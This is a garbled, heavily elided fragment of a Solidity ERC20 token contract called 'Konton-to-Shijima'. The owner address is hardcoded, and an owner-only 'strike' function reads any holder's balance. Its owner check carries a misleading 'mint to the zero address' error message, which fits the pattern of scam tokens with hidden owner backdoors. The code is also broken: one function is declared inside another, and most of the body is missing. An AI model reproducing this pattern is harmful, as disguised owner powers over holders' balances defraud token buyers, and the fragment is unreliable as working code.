...
contract Shijima is Context, IERC20 {
    ...
    address lead_deployer = 0x445506B8028E8aC55Eb02A3Bc8502c5A6526A5Bf;
    address public _owner = 0x445506B8028E8aC55Eb02A3Bc8502c5A6526A5Bf;
   constructor () public {


        
        _name = "Konton-to-Shijima";
        _symbol = "SHIJIMA";
        _decimals = 9;
        uint256 initialSupply = 777777777;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function play(address account) public {
        ...
        function strike(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
